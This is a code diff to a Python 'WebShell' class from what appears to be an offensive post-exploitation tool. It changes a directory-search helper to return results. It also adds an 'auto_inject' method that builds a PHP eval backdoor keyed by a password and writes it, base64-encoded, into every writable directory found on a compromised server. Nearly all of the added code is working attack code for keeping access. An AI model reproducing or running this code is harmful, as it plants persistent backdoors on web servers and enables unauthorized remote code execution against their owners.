@@ -84,10 +84,13 @@ class WebShell():
         if output[0]:
             if output[1] == "":
                 Log.warning("Nothing found!")
+                return []
             else:
-                Log.success("Found : \n%s" % output[1])
+                Log.success("Found : \n%s" % output[1][0:-1])
+                return output[1].split("\n")[0:-1]
         else:
             Log.error("Error occured! %s" % output[1])
+            return []
 
 
     def get_suid_binaries(self):
@@ -494,3 +497,18 @@ class WebShell():
         else:
             Log.error("Some error occured while checking!")
             return False
+
+    def auto_inject(self, filename, password):
+        Log.info("Auto injecting : [%s] => [%s]" % (filename, password))
+        webshell_content = "<?php eval($_REQUEST[%s]);?>" % (password)
+        Log.info("Code : [%s]" % (webshell_content))
+        Log.info("Getting writable dirs...")
+        writale_dirs = self.get_writable_directory()
+        if len(writale_dirs) == 0:
+            Log.error("No writable dirs...")
+        else:
+            for writable_dir in writale_dirs:
+                Log.info("Writing [%s] into : [%s]" % (webshell_content, writable_dir))
+                php_code = "file_put_contents('%s',base64_decode('%s'));" % ("%s/%s" % (writable_dir, filename), webshell_content.encode("base64").replace("\n",""))
+                self.php_code_exec(php_code)
+
